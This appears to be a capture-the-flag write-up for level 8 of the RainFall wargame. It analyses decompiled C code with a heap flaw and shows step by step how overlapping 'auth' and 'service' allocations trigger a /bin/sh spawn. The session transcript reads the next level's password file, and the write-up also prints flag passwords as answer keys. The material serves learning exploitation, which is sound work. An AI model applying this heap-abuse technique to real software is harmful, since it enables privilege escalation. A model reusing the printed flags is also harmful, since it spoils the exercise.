# Level8

## Analysis

**In `main()`:**

```c
    // print the global variables 'auth' 'service'
    printf("%p, %p\n", auth, service);

    // gets the stdin with a limit of 128 characters
    if (fgets(buf, 0x80, stdin) == 0)
        break ;
    
    // Give a value to 'auth' with a limit of 30 characters
    if (strncmp(buf, "auth ", 5) == 0)
    {
        auth = malloc(4);
        if (strlen(buf + 5) <= 30)
            strcpy(auth, buf + 5);
    }

    // free 'auth'
    if (strncmp(buf, "reset", 5) == 0)
        free(auth);
    
    // Give a value to 'service', no limit
    if (strncmp(buf, "service", 6) == 0)
        service = strdup(buf + 7);
    
    // Open shell if the 32nd character of 'auth' isn't Null
    if (strncmp(buf, "login", 5) == 0)
    {
        if (auth[0x20] != 0) // 32
            system("/bin/sh");
        else
            fwrite("Password:\n", 10, 1, stdout);
    }
```

___

## Exploit

So we need to create auth and have at least **`32`** characters in it but its limited to **`30`**

But if we create an empty `auth` and then `service`, the 32nd character of `auth` will be in `service`

Solution:
 * Create auth
   * auth
 * Create service with enough characters to change the 32nd one of auth (16)
   * service AAAAAAAAAAAAAAAA
 * Login
   * login


```
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service AAAAAAAAAAAAAAAA
0x804a008, 0x804a018
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

___

*Password: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9*